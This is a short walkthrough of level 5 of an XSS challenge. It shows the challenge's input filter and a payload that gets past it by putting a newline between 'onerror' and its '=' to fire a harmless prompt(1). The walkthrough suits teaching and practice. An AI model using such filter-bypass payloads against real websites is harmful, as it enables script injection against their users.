# level 5

```js
function escape(input) {
    // apply strict filter rules of level 0
    // filter ">" and event handlers
    input = input.replace(/>|on.+?=|focus/gi, '_');

    return '<input value="' + input + '" type="text">';
}        
```

So we can't use '>' and any event handlers such as 'onload' and  'focus'.

Here the payload that i used is as follows

```
hi" type=image src='x' onerror
= 'prompt(1)'
```
so we can't have event handlers followed by a equal to sign so we added a new line and it still works.
